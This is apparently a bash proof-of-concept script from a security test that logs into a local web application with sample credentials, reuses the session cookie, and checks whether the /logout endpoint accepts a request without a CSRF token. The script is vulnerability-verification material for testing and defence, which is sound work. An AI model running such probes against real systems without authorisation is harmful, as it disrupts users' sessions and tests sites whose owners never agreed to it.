#!/bin/bash
# CSRF on Logout Endpoint

# Get session cookie
SESSION_RESPONSE=$(curl -i -c /tmp/session_cookies.txt -X POST http://localhost/login \
  -d "username=john&password=password123" 2>&1)

SESSION=$(echo "$SESSION_RESPONSE" | grep "Set-Cookie" | grep "session=" | cut -d'=' -f2 | cut -d';' -f1)

if [ -z "$SESSION" ]; then
  echo "Failed to authenticate"
  exit 1
fi

# Verify user is logged in
USER_CHECK=$(curl -s -b "session=$SESSION" http://localhost/dashboard | grep "Welcome, john")
if [ -z "$USER_CHECK" ]; then
  echo "Failed to login"
  exit 1
fi

# Make CSRF logout request (no CSRF token needed)
echo "Attempting CSRF logout..."
LOGOUT_RESPONSE=$(curl -s -b "session=$SESSION" http://localhost/logout)

# Check if logout was successful by trying to access dashboard
DASHBOARD_CHECK=$(curl -s -b "session=$SESSION" http://localhost/dashboard | grep "Redirecting")

if [ ! -z "$DASHBOARD_CHECK" ]; then
  echo "CSRF VULNERABILITY CONFIRMED - Logout executed without CSRF protection"
  exit 0
else
  echo "Logout may have failed"
  exit 1
fi
